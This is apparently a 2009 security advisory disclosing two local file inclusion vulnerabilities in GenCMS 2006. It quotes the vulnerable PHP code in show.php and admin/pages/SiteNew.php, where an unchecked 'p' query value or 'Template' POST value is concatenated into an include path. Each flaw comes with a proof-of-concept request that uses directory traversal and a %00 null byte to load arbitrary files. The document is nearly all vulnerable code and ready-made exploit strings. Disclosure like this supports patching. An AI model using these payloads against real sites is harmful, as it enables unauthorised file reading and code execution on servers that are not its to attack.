GenCMS 2006 Multiple Remote Vulnerabilities
===========================================


GenCMS
http://gencms.berlios.de/

eLwaux(c)2009

LFI
/show.php
----------------------------------------------------------------------------------------------------
18:   $param = $_GET[&#039;p&#039;];
19:   if(empty($param)) $param = &#039;news&#039;;
20:          //get right page
21:       //$page = $param.&#039;.php&#039;;
22:	
23:    //static or dynamic
24:    if(GC_FULLSTATIC)
25:    {
26:        $page = $param.&#039;.htm&#039;;
27:        staticpage($page);
28:    }
29:    else
30:    {
31:        $page = GC_IPATH.&#039;_base/sites/&#039;.$param.&#039;.php&#039;;
32:        dynamicpage($page);
33:    }
----------------------------------------------------------------------------------------------------
PoC: /show.php?p=../../{FILE.PHP}%00


LFI
/admin/pages/SiteNew.php
----------------------------------------------------------------------------------------------------
14:   if(!empty($_GET[&#039;step&#039;])) $Step = $_GET[&#039;step&#039;];
23:   if ($Step == "2")
24:   {
25:        // allgemeine settings
26:        //include blocks from template config
27:        include_once(GC_IPATH.&#039;templates/&#039;.$_POST[&#039;Template&#039;].&#039;/config.php&#039;);
28:        $TPLBlocks = explode(&#039;;&#039;,$TemplateSettings);
29:   }
----------------------------------------------------------------------------------------------------
PoC: /admin/pages/SiteNew.php?step=2& ( POST: Template=../{FILE.PHP}%00 )



